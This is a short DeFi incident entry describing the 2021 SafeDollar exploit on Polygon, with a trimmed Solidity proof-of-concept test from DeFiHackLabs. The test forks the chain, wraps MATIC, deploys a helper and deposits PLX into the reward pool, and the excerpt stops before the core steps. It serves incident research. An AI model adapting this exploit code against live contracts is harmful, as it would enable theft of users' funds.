# [?] SafeDollar - Deflationary token uncompatible

## Summary
Severity: Unknown
Chain: Polygon
Component: SafeDollar
Published: 2021-06-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/SafeDollar_exp.sol
Type: defi-exploit-poc

## Details
Lost: $.2 million

```solidity
contract ContractTest is Test {
    IERC20 SDO = IERC20(0x86BC05a6f65efdaDa08528Ec66603Aef175D967f);
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 PLX = IERC20(0x7A5dc8A09c831251026302C93A778748dd48b4DF);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    Uni_Router_V2 Router = Uni_Router_V2(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74);
    SdoRewardPOOL Pool = SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);
    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0xD33992A7367523B04949C7693d6506d4a7e19446); // WETH PLX
    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x948d4AE4e9Ebf2AC6E787D29B94d0fF440EF2e4D); // WMATIC PLX
    uint256 amounts0;
    uint256 amounts1;
    address addressContract;
    uint256 reserve0Pair1;
    uint256 reserve1Pair1;
    uint256 reserve0Pair2;
    uint256 reserve1Pair2;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("polygon", 16_225_172);
    }

    function testExploit() public payable {
        PLX.approve(address(Pool), type(uint256).max);
        WMATIC.approve(address(Router), type(uint256).max);
        (reserve0Pair1, reserve1Pair1,) = Pair1.getReserves();
        (reserve0Pair2, reserve1Pair2,) = Pair2.getReserves();
        address(WMATIC).call{value: 10_000 ether}("");
        // depost PLX
        ContractFactory();
        (bool success,) = addressContract.call{value: 1 ether}(abi.encodeWithSignature("depositPLX()"));
        //revert();
        require(success);
        // change block.timestamp
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/SafeDollar_exp.sol_
